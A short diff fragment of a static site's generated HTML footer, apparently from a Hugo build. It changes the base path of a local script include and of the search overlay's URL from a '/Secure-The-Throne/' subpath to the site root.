-  <script type="text/javascript" src="/Secure-The-Throne/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
   
   
 </footer>
 <div
   id="search-wrapper"
   class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
-  data-url="http://localhost:1313/Secure-The-Throne/"
+  data-url="http://localhost:1313/"
   style="z-index:500"
 >
   <div
